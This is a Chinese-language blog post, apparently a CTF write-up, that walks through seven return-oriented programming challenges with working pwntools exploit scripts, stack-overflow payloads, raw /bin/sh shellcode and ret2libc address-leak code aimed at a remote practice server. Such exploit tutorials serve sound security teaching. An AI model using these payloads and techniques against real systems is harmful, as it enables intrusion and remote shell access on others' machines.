<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>ROP专项总结 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一、What is ROP ROP的全称为Return-orientedprogramming(返回导向编程)，这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御(比如内存不可执行和代码签名等)。虽然现在大家都在用64位的操作系统，但是想要扎实学好ROP还是得从基础的x86系统开始。在随后的教程中我们还会带来linux_x64以及android(arm)方面的ROP利用方法，欢迎大">
<meta name="keywords" content="pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="ROP专项总结">
<meta property="og:url" content="http://yoursite.com/2018/11/21/ROP专项总结/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="一、What is ROP ROP的全称为Return-orientedprogramming(返回导向编程)，这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御(比如内存不可执行和代码签名等)。虽然现在大家都在用64位的操作系统，但是想要扎实学好ROP还是得从基础的x86系统开始。在随后的教程中我们还会带来linux_x64以及android(arm)方面的ROP利用方法，欢迎大">
<meta property="og:locale" content="default">
<meta property="og:image" content="f:/kaliwork/CTF/CSU/Pwn/r1ida3.png">
<meta property="og:image" content="f:/kaliwork/CTF/CSU/Pwn/r3ida3.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542076673595.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542078081480.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542078103453.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542078206534.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542078946549.png">
<meta property="og:image" content="c:/WINDOWS/TEMP/1542081640188.png">
<meta property="og:updated_time" content="2018-11-21T13:30:15.594Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ROP专项总结">
<meta name="twitter:description" content="一、What is ROP ROP的全称为Return-orientedprogramming(返回导向编程)，这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御(比如内存不可执行和代码签名等)。虽然现在大家都在用64位的操作系统，但是想要扎实学好ROP还是得从基础的x86系统开始。在随后的教程中我们还会带来linux_x64以及android(arm)方面的ROP利用方法，欢迎大">
<meta name="twitter:image" content="f:/kaliwork/CTF/CSU/Pwn/r1ida3.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-ROP专项总结" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/ROP专项总结/" class="article-date">
  <time datetime="2018-11-20T16:19:50.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      ROP专项总结
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一、What is ROP</p>
<p>ROP的全称为Return-oriented<br>programming(返回导向编程)，这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御(比如内存不可执行和代码签名等)。虽然现在大家都在用64位的操作系统，但是想要扎实学好ROP还是得从基础的x86系统开始。在随后的教程中我们还会带来linux_x64以及android(arm)方面的ROP利用方法，欢迎大家继续学习。</p>
<p>二、实战演示</p>
<p>1、ROP_LEV1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h][bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段程序很明显是有漏洞的,buf缓冲区大小0x88 &lt; 0x200（read）。</p>
<p>典型的缓冲区溢出，接下来就是怎么利用的问题了。会发现居然有一个callsystem函数：</p>
<p><img src="F:\kaliwork\CTF\CSU\Pwn\r1ida3.png" alt=""></p>
<p>显然，我们只需要把ret地址覆盖为callsystem函数的地址就OK。</p>
<p>构造的payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callsysadr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(callsysadr)</span><br></pre></td></tr></table></figure>
<p>可以发现，这个pwn很简单。能够直接利用程序现有的system函数调用，只需要简单的引导程序流程就好。接下来会有所不同。</p>
<p>2、ROP_LEV2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);            <span class="comment">// 输出buf的地址</span></span><br><span class="line">                                                <span class="comment">// 可以recvline得到地址作为shellcode首地址</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// 溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样是read函数导致的缓冲区溢出问题，不同的是程序并没有提供供我们调用的类似于callsystem的函数。</p>
<p>这个时候就需要我们自己去写shellcode(当然如果对shellcode的字节数没有太高的要求的话，比如这个题目，用pwntools提供的shellcraft就OK)。问题的关键在于，我们怎么引导程序执行我们提供的shellcode，显然，需要用shellcode的首地址来覆盖ret。OK，那么shellcode的首地址在哪？如何得知？</p>
<p>嘿，这个时候就是考验C语言功底的了，%p岂不就是输出地址，也就是说程序为我们提供了buf缓冲区的首地址。这不就是为我们的shellcode做嫁衣……，何不直接把shellcode写在buf首地址处，再用它覆盖ret。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.197.58.168'</span>,<span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">shell_adr = p.recvline()[<span class="number">12</span>:<span class="number">-2</span>]				<span class="comment">#buf_addr</span></span><br><span class="line">shell_adr = int(adr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x04</span> - len(shellcode)) + p32(shell_adr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>怎么样？这个是不是就有点意思啦。</p>
<p>别急，未完继续……</p>
<p>3、ROP_LEV3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);                <span class="comment">// 有system函数调用</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// 溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一下，有溢出、有system函数可以使用，那么字符串’/bin/sh’有没有呢？</p>
<p><img src="F:\kaliwork\CTF\CSU\Pwn\r3ida3.png" alt=""></p>
<p>（当然得有，不然怎么展示……）</p>
<p>比起ROP_LEV1,你会发现，这个更“委婉”，它为我们准备了system函数，也准备了”/bin/sh”串。但就是不会主动执行。</p>
<p>那我们的目标就很明确了，想办法把这两个”联系“起来，i386(32bit)的函数调用，参数与函数有什么联系？当然是栈的分布。</p>
<p><img src="C:\WINDOWS\TEMP\1542076673595.png" alt="1542076673595"></p>
<p>传递payload的想要的效果就像是上面展示的一样，2到3的转化其实就是我们用一个函数（system)地址覆盖RET后，执行的以下指令:    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
<p>这时候，熟悉函数调用的栈帧结构就知道 [ebp+8]就是system函数的参数，换句话说，我们需要把”/bin/sh”放在M的位置。</p>
<p>在结束函数执行的结尾，执行以下指令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<p>这时候，执行pop ebp过后；esp就指向了W的位置，也就是说W处就是执行system函数的返回地址。</p>
<p>鉴于以上，构造的payload就是这样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./rop_lev3'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0x12345612</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<p>这个题目，比较基础（但很重要），尤其是可以巩固加强对栈帧的建立和清除的过程的理解与掌握。</p>
<p>4、ROP_LEV4</p>
<p>先放图吧</p>
<p><img src="C:\WINDOWS\TEMP\1542078081480.png" alt="1542078081480"></p>
<p><img src="C:\WINDOWS\TEMP\1542078103453.png" alt="1542078103453"></p>
<p><img src="C:\WINDOWS\TEMP\1542078206534.png" alt="1542078206534"></p>
<pre><code>咦，怎么和上一个神相似……

没错，是很像，不同的是ROP4是x64，ROP3是x86。两者是有很大不同的。

linux_64与linux_86的区别主要有两点：**首先是内存地址的范围由32位变成了64位**。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。**其次是函数参数的传递方式发生了改变**，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。

对此，我们需要在程序中寻找诸如“pop rdi; ret”这样的代码片段（gadget），先引导程序执行代码片段，将输入在栈中的参数弹到寄存器中，再引导程序执行system()函数。推荐工具：ROPgadget。

找到&quot;pop rdi;ret&quot;代码段后，就OK了，直接构造payload。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(pop_ret_addr) + p64(bin_addr) + p64(systemaddr)</span><br></pre></td></tr></table></figure>
<p>5、ROP_LEV5</p>
<p><img src="C:\WINDOWS\TEMP\1542078946549.png" alt="1542078946549"></p>
<pre><code>这里的fgets读取了50个byte到s缓冲区，而s缓冲区的大小只有0x20个。（强烈暗示存在可利用的溢出）
</code></pre><p>问题是怎么利用，一般的想法，是把ret覆盖为一个函数，但是这题是找不到system，”/bin/sh”的。有没有想到ROP_LEV2的自己构造shellcode。</p>
<pre><code>没错，这个也需要shellcode，可是这个的shellcode很有讲究。

首先，我们不知道s缓冲区的首地址，无法直接用这个地址来覆盖ret。

我们可以想办法把shellcode放在ret后面的区域，利用这样一个细节：在函数返回的时候， esp恰好指向栈帧中返回地址的后一个位置。这个时候可能会想，能不能把shellcode放在esp的位置，把ret覆盖为指令&quot;jmp esp;&quot;的地址就可以了。这个想法没错，但是要考虑一点，长度。比如，这道题fgets进了50个byte，我们需要(0x20 + 0x04)byte的垃圾填充，只剩余14个byte用来做shellcode的空间（目前我找不到，也写不出这样短的）。而且来说，这样做还会有一个坏处，就是不能够修复寄存器的值，使得函数正常地返回继续执行原程序。

放在s缓冲区？可以想办法把esp指向s的首地址（在这题指令： sub esp, 0x20 + 0x08就能做到)
</code></pre><p>再执行指令”jmp esp;”就可以把程序流程EIP引导至s首地址处。</p>
<pre><code>构造payload之前，想办法把sub esp, 0x28转化成机器码&quot;83EC28FFE4&quot;，用OD就可以。

至于shellcode，在网上能找到很多（我找到的是一个24字节的）；payload如下
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">"\x31\xc9"</span></span><br><span class="line">shellcode += <span class="string">"\xf7\xe1"</span></span><br><span class="line">shellcode += <span class="string">"\x51"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x2f\x2f\x73\x68"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x89\xe3"</span></span><br><span class="line">shellcode += <span class="string">"\xb0\x0b"</span></span><br><span class="line">shellcode += <span class="string">"\xcd\x80"</span></span><br><span class="line">jmp_addr = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">0x24</span> - len(shellcode)) </span><br><span class="line">payload += p32(jmp_addr) + <span class="string">"\x83\xec\x28\xff\xe4"</span></span><br></pre></td></tr></table></figure>
<pre><code>6、ROP_LEV6

看图
</code></pre><p><img src="C:\WINDOWS\TEMP\1542081640188.png" alt="1542081640188"></p>
<pre><code>本题我们来练习x86下ret2libc利用方法。system()函数和&quot;/bin/sh&quot;字符串都不能从程序段中找到了。而libc.so里面存放有system()函数的实现，以及&quot;/bin/sh&quot;字符串，该文件会在程序执行时动态链接进内存。我们需要想办法获得system()函数和&quot;/bin/sh&quot;字符串的地址，由于开启了地址随机化，我们需要计算出libc在内存中的基址。一种常见的办法是，先引导程序到某一输出函数，从而泄露出某个库函数在GOT表中存放的该函数在内存中的实际地址，以确定libc的版本号，再根据偏移不变原理，依据“基址+偏移=实际地址”公式计算出libc基址。从而就可以得到system()函数和&quot;/bin/sh&quot;字符串的地址。推荐工具：libc-database + LibcSearcher或DynELF

采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。一个简单的leak(address)实现模板如下：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*(padding_len) + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<pre><code>采用libc-database + LibcSesrcher时，需要准备libc-database，LibcSearcher，在github上面有很多。

用这个，我们同样需要leak一个函数地址；例如利用write函数leak一个地址，一般选择函数&quot;__libc_start_main&quot;:
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(libc_start_main) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
<pre><code>之后再用LibcSearcher(leak_funname, leak_addr)来查询匹配的libc版本，可能会有很多备选，这时候可以多leak几个函数的地址，用add_condition（leak_funname,leak_addr)来增强匹配的准确性。像这样：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">"read"</span>, read_GLIBC_addr)</span><br><span class="line">libc.add_condition(<span class="string">"__libc_start_main"</span>,libc_start_main_addr)</span><br></pre></td></tr></table></figure>
<pre><code>得到libc的版本号，就可以用libc.dump(function_name)得到函数的偏移。利用运行时的内存地址减去这个偏移就得到了基址。有了基址，任何知道偏移的函数的地址都可以得到：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libcbase = read_GLIBC_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br></pre></td></tr></table></figure>
<pre><code>不难得到完整的exp
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./rop_lev6'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_GLIBC = elf.got[<span class="string">'read'</span>]</span><br><span class="line">libc_start_main = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p = remote(<span class="string">'202.197.58.168'</span>,<span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"****leak read@GLIBC_2.0_addr and libc_start_main_addr and return to main******"</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(read_GLIBC) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">read_GLIBC_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(libc_start_main) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_GLIBC_addr </span><br><span class="line"><span class="keyword">print</span> libc_start_main_addr</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>, read_GLIBC_addr)</span><br><span class="line">libc.add_condition(<span class="string">"__libc_start_main"</span>,libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libcbase = read_GLIBC_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"******* get shell *****"</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(system_addr) + p32(main) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>7、ROP_LEV7</p>
<pre><code>看图

![1542082926541](C:\WINDOWS\TEMP\1542082926541.png)



可以看到这里只有一个read导致的 overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”给它作参数。最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们看一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:0000000000400650                 push    r15</span><br><span class="line">.text:0000000000400652                 mov     r15d, edi</span><br><span class="line">.text:0000000000400655                 push    r14</span><br><span class="line">.text:0000000000400657                 mov     r14, rsi</span><br><span class="line">.text:000000000040065A                 push    r13</span><br><span class="line">.text:000000000040065C                 mov     r13, rdx</span><br><span class="line">.text:000000000040065F                 push    r12</span><br><span class="line">.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400668                 push    rbp</span><br><span class="line">.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400670                 push    rbx</span><br><span class="line">.text:0000000000400671                 sub     rbp, r12</span><br><span class="line">.text:0000000000400674                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400676                 sar     rbp, 3</span><br><span class="line">.text:000000000040067A                 sub     rsp, 8</span><br><span class="line">.text:000000000040067E                 call    _init_proc</span><br><span class="line">.text:0000000000400683                 test    rbp, rbp</span><br><span class="line">.text:0000000000400686                 jz      short loc_4006A6</span><br><span class="line">.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400690</span><br><span class="line">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400690                 mov     rdx, r13</span><br><span class="line">.text:0000000000400693                 mov     rsi, r14</span><br><span class="line">.text:0000000000400696                 mov     edi, r15d</span><br><span class="line">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040069D                 add     rbx, 1</span><br><span class="line">.text:00000000004006A1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006A4                 jnz     short loc_400690</span><br><span class="line">.text:00000000004006A6</span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j</span><br><span class="line">.text:00000000004006A6                 add     rsp, 8</span><br><span class="line">.text:00000000004006AA                 pop     rbx</span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn</span><br><span class="line">.text:00000000004006B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
